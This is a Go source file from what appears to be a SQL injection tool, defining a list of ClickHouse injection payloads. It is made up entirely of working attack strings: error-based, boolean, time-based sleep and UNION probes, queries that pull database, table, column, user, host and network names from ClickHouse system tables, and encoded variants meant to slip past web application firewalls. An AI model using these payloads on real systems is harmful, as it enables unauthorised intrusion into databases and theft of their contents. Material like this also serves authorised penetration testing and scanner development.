package payloads

var ClickHouse = PayloadGroup{
	DBMS: "ClickHouse",
	Payloads: []Payload{
		// ═══════════════════════════════════════════
		// ERROR-BASED
		// ═══════════════════════════════════════════
		{Type: "error", Content: "' AND 1=DBMS_VERSION()--"},
		{Type: "error", Content: "' AND 1=VERSION()--"},
		{Type: "error", Content: "' AND 1=currentDatabase()--"},
		{Type: "error", Content: "' AND 1=defaultDatabase()--"},
		{Type: "error", Content: "' AND 1=USER()--"},
		{Type: "error", Content: "' AND arrayJoin([1])--"},
		{Type: "error", Content: "' AND 1=CAST((SELECT groupArray(hostName()) FROM system.clusters) AS INT)--"},
		{Type: "error", Content: "' AND extractAll((SELECT groupArray(hostName()) FROM system.clusters), '.')--"},

		// ═══════════════════════════════════════════
		// BOOLEAN-BASED
		// ═══════════════════════════════════════════
		{Type: "boolean", Content: "' AND 1=1--", Expected: "true"},
		{Type: "boolean", Content: "' AND 1=2--", Expected: "false"},
		{Type: "boolean", Content: "' AND 1=1 AND '1'='1--", Expected: "true"},
		{Type: "boolean", Content: "' AND 1=2 AND '1'='1--", Expected: "false"},
		{Type: "boolean", Content: "' OR 1=1--", Expected: "true"},
		{Type: "boolean", Content: "' OR 1=2--", Expected: "false"},
		{Type: "boolean", Content: "') OR 1=1--", Expected: "true"},
		{Type: "boolean", Content: "') OR 1=2--", Expected: "false"},

		// ═══════════════════════════════════════════
		// TIME-BASED (ClickHouse SLEEP via function)
		// ═══════════════════════════════════════════
		{Type: "time", Content: "' AND sleep(5)--"},
		{Type: "time", Content: "' AND sleep(10)--"},
		{Type: "time", Content: "'; SELECT sleep(5)--"},
		{Type: "time", Content: "' OR sleep(5)='"},
		{Type: "time", Content: "') OR sleep(5)--"},
		{Type: "time", Content: "' OR 1=sleep(5)--"},
		{Type: "time", Content: "' AND 1=1 UNION SELECT sleep(5)--"},
		{Type: "time", Content: "' AND 1=1 UNION ALL SELECT sleep(5)--"},
		{Type: "time", Content: "' AND 1 IN (SELECT sleep(5))--"},
		{Type: "time", Content: "' AND exists(SELECT sleep(5))--"},

		// ═══════════════════════════════════════════
		// UNION-BASED
		// ═══════════════════════════════════════════
		{Type: "union", Content: "') UNION SELECT 1--"},
		{Type: "union", Content: "') UNION SELECT 1,2--"},
		{Type: "union", Content: "') UNION SELECT 1,2,3--"},
		{Type: "union", Content: "') UNION SELECT 1,2,3,4--"},
		{Type: "union", Content: "') UNION SELECT 1,2,3,4,5--"},
		{Type: "union", Content: "') UNION SELECT 1,2,3,4,5,6--"},
		{Type: "union", Content: "') UNION ALL SELECT 1--"},
		{Type: "union", Content: "' UNION SELECT 1--"},
		{Type: "union", Content: "' UNION SELECT 1,2--"},

		// ═══════════════════════════════════════════
		// DATA EXTRACTION (system tables)
		// ═══════════════════════════════════════════
		{Type: "deep", Content: "') UNION SELECT name FROM system.databases--"},
		{Type: "deep", Content: "') UNION SELECT name FROM system.tables--"},
		{Type: "deep", Content: "') UNION SELECT name FROM system.columns--"},
		{Type: "deep", Content: "' UNION SELECT groupArray(hostName()) FROM system.clusters--"},
		{Type: "deep", Content: "' UNION SELECT groupArray(interface) FROM system.networks--"},
		{Type: "deep", Content: "' UNION SELECT groupArray(version()) FROM system.build_options--"},
		{Type: "deep", Content: "' UNION SELECT groupArray(user) FROM system.users--"},
		{Type: "deep", Content: "' UNION SELECT groupArray(name) FROM system.databases--"},

		// ═══════════════════════════════════════════
		// WAF BYPASS
		// ═══════════════════════════════════════════
		{Type: "bypass", Content: "'%01OR%01'1'%01=%01'1"},
		{Type: "bypass", Content: "'/**/OR/**/1=1--"},
		{Type: "bypass", Content: "'%09OR%091=1--"},
		{Type: "bypass", Content: "'%0AOR%0A1=1--"},
		{Type: "bypass", Content: "'/*!OR*/1=1--"},
		{Type: "bypass", Content: "'+OR+1=1--"},
		{Type: "bypass", Content: "\"OR\"1\"=\"1"},
		{Type: "bypass", Content: "1%27%20OR%201%3D1--"},
	},
}

